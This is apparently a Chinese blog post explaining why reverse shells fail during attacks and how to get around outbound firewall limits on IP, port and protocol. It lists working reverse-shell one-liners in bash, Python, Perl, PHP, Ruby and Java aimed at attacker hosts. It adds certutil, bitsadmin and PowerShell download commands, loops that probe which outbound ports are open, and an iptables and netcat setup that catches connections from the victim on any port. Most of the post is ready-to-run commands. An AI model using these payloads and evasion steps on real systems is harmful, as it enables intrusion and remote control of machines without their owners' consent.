**目录**

[反弹的命令不存在或当前用户无权限调用bash](#t0)

[禁止出站IP](#t1)

[禁止出站协议](#t2)

[探测HTTP协议](#t3)

[探测ICMP协议](#t4)

[探测DNS协议](#t5)

[禁止出站端口](#t6)

[Linux系统](#t7)

[Windows系统](#t8)

[探测的端口范围](#t9)

[攻击端的端口请求记录](#t10)

* * *

在实战中，我们经常会遇到各种各样奇怪的环境。

![](https://img-blog.csdnimg.cn/20200503183238424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

反弹shell失败的原因有很多：

*   反弹的命令不存在或当前用户无权限调用bash
*   禁止出站IP(只允许访问特定ip)
*   禁止出站端口(只允许访问特定端口)
*   禁止出站协议(只允许特定协议，如icmp、dns、http)

反弹的命令不存在或当前用户无权限调用bash
----------------------

由于这种情况下只局限于Linux，所以不考虑Windows

反弹shell的命令，尽管这么多命令可以反弹shell，但是最终都还是调用bash来反弹，如下：

```
#bash反弹      
bash -i >& /dev/tcp/192.168.10.27/4444 0>&1      
#python反弹      
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'      
#Perl反弹      
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'      
#PHP反弹      
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3>&3 2>&3");'      
#Ruby反弹      1
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'      1
#Java反弹      1
r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[]) p.waitFor()
```


![](https://img-blog.csdnimg.cn/20200503181655660.png)

![](https://img-blog.csdnimg.cn/20190727134148927.png)
------------------------------------------------------

禁止出站IP
------

对于这种情况的话，就很麻烦了。如果目标主机设置了严格的策略，只允许主动连接公网指定的IP。这样的话，就没办法反弹shell了。

禁止出站协议
------

对于禁止出站协议这种情况的话，我们先得探测目标机器允许哪些协议出公网。

### 探测HTTP协议

```
Linux系统可以使用curl命令：      
    curl http://192.168.10.13      
Windows系统可以使用以下命令：      
    certutil -urlcache -split -f http://192.168.10.13/1      
    bitsadmin /transfer test http://192.168.10.13/1 c:\1      
    powershell iwr -Uri http://192.168.10.13/1 -OutFile 1 -UseBasicParsing
```


![](https://img-blog.csdnimg.cn/20200503184057723.png)

![](https://img-blog.csdnimg.cn/20200503184342722.png)

![](https://img-blog.csdnimg.cn/20200503190701678.png)

### 探测ICMP协议

```
服务端监听ICMP流量：tcpdump icmp      
客户端ping VPS地址，查看服务端能否收到请求
```


我们VPS[监听](https://so.csdn.net/so/search?q=%E7%9B%91%E5%90%AC&spm=1001.2101.3001.7020)，然后ping我们vps查看能否收到监听来判断ICMP 协议是否出网。也可以直接ping一个地址，看是否有ttl值。

![](https://img-blog.csdnimg.cn/20200503184246247.png)

### 探测DNS协议

```
Windows：nslookup、ping      
Linux：nslookup、dig、ping
```


通过判断能否将域名解析为ip，判断DNS协议是否出网。也可以将域名换成dnslog的域名，再看dnslog能否收到请求  ![](https://img-blog.csdnimg.cn/20200503185624496.png)

禁止出站端口
------

如果防火墙上做了限制，只允许该服务器访问公网地址的特定端口。那么，这样的话，我们就必须得找到允许访问的端口了。

这里有一篇文章对这个讲的很好，传送门：[照弹不误：出站端口受限环境下反弹Shell的思考](https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651081947&idx=1&sn=a1034b30907411abfd730e45d07aa573&chksm=bd1fde508a685746ed9b63b19b457f6d9121992ee3af29a172d6f33bfbe5c2797a13a09ef61c&mpshare=1&scene=1&srcid=0421NmOEXG9CvJ1f7R9sQiN5&sharer_sharetime=1587481022873&sharer_shareid=31c8cf8cc2b90a177f89e7933c803ca5&key=8bd6b37e905b7deeaae65bf63453d31a5e2016cf46bc84b4318e1319320dde1d60beb1340406d98b0bba702e21798a5a8a8c44b4e3d7dc9931abe1ead9b71983dbf61aa86397f3ddc514038c88ad27d1&ascene=1&uin=MjIwMDQzNjQxOQ%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=A1pYZLo5qSufoNLb2434bDI%3D&pass_ticket=YmtPvDlSlHNFTRPe19jpOh%2Bw%2F3UGQtVKGktRzpy8fupXr4M1lcOXVVP12L3xt%2BW7)

以下是该文的一些思路

### Linux系统

对于Linux系统，探测其允许出网的端口，这里使用的是Linux的自带命令，所以适用于每个Linux版本。

```
for i in {440..449};do timeout 0.5 bash -c "echo >/dev/tcp/baidu.com/$i" && echo "$i ************************open************************" || echo "$i closed";done       
也可以将结果写入文件中      
for i in {440..449};do timeout 0.5 bash -c "echo >/dev/tcp/baidu.com/$i" && echo "$i ************************open************************"|| echo "$i closed";done >> result.txt       
探测常见端口      
for i in {21,22,23,25,53，80,88,110,137,138,139,123,143,389,443,445,161,1521,3306,3389,6379,7001,7002,8000,8001,8080,8090,9000,9090,11211};do timeout 0.5 bash -c "echo >/dev/tcp/baidu.com/$i" && echo "$i ************************open************************" || echo "$i closed";done
```


![](https://img-blog.csdnimg.cn/2020083016291886.png)

![](https://img-blog.csdnimg.cn/20200830165534645.png)

![](https://img-blog.csdnimg.cn/20200830163057303.png)

### Windows系统

```
powershell -c "440..445 | %{tnc -InformationLevel Quiet 220.181.38.148 -port $_}"      
powershell -c "53,80,443 | %{tnc -InformationLevel Quiet 220.181.38.148 -port $_}"       
或者       
powershell -c "80,81 | %{try {(new-object Net.Sockets.TcpClient).Connect('220.181.38.148',$_);Write-Host "$_ open"} catch {Write-Host "$_ closed"} finally {} }"|findstr /I open
```


![](https://img-blog.csdnimg.cn/20200830161331976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200830162036871.png)

![](https://img-blog.csdnimg.cn/20200830174543952.png)

### 探测的端口范围

可以根据nmap的端口范围探测

```
nmap -n --top-ports 100 127.0.0.1 -oA foo > /dev/null      
grep -i "services\=" foo.xml | sed -r 's/.*services\=\"(.*)(\"\/>)/\1/g'
```


 ![](https://img-blog.csdnimg.cn/2020083018262838.png)

### 攻击端的端口请求记录

我们攻击端这边需要有目标机访问的记录，才能更好的判断目标机器是否访问了我们。这样，只要目标机器访问到了我们VPS的任意一个端口，我们这边都能有记录。

```
//备份iptables规则      
iptables-save > /tmp/firewall.rules      
//将所有端口的流量都转发到34444端口      
iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 34444      
//监听34444端口      
nc -lvp 34444      
//恢复iptables规则      
iptables-restore < /tmp/firewall.rules
```


参考文章：[照弹不误：出站端口受限环境下反弹Shell的思考](https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651081947&idx=1&sn=a1034b30907411abfd730e45d07aa573&chksm=bd1fde508a685746ed9b63b19b457f6d9121992ee3af29a172d6f33bfbe5c2797a13a09ef61c&mpshare=1&scene=1&srcid=0421NmOEXG9CvJ1f7R9sQiN5&sharer_sharetime=1587481022873&sharer_shareid=31c8cf8cc2b90a177f89e7933c803ca5&key=8bd6b37e905b7deeaae65bf63453d31a5e2016cf46bc84b4318e1319320dde1d60beb1340406d98b0bba702e21798a5a8a8c44b4e3d7dc9931abe1ead9b71983dbf61aa86397f3ddc514038c88ad27d1&ascene=1&uin=MjIwMDQzNjQxOQ%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=A1pYZLo5qSufoNLb2434bDI%3D&pass_ticket=YmtPvDlSlHNFTRPe19jpOh%2Bw%2F3UGQtVKGktRzpy8fupXr4M1lcOXVVP12L3xt%2BW7)